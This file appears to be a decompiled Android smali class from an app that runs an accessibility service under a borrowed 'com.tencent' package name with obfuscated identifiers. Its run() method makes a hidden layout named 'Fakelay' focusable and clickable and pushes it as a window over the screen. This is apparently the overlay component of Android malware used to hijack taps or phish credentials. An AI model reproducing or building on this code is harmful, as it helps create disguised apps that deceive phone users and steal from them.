.class Lcom/tencent/AccessibilityServiceCore$16;
.super Ljava/lang/Object;
.source "tunesxconcerningn1012.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/tencent/AccessibilityServiceCore;->onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/tencent/AccessibilityServiceCore;


# direct methods
.method constructor <init>(Lcom/tencent/AccessibilityServiceCore;)V
    .locals 0

    .line 2337
    iput-object p1, p0, Lcom/tencent/AccessibilityServiceCore$16;->this$0:Lcom/tencent/AccessibilityServiceCore;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 3

    .line 2344
    :try_start_0
    sget-object v0, Lcom/tencent/AccessibilityServiceCore;->Fakelay:Landroid/widget/FrameLayout;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/widget/FrameLayout;->setFocusable(Z)V

    .line 2345
    sget-object v0, Lcom/tencent/AccessibilityServiceCore;->Fakelay:Landroid/widget/FrameLayout;

    invoke-virtual {v0, v1}, Landroid/widget/FrameLayout;->setClickable(Z)V

    .line 2346
    sget-object v0, Lcom/tencent/AccessibilityServiceCore;->Fakelay:Landroid/widget/FrameLayout;

    sget-object v1, Lcom/tencent/AccessibilityServiceCore;->Fakeparams:Landroid/view/WindowManager$LayoutParams;

    invoke-virtual {v0, v1}, Landroid/widget/FrameLayout;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    .line 2347
    sget-object v0, Lcom/tencent/AccessibilityServiceCore;->tunesxconcerningn1012wm:Landroid/view/WindowManager;

    sget-object v1, Lcom/tencent/AccessibilityServiceCore;->Fakelay:Landroid/widget/FrameLayout;

    sget-object v2, Lcom/tencent/AccessibilityServiceCore;->Fakeparams:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v0, v1, v2}, Landroid/view/WindowManager;->updateViewLayout(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method
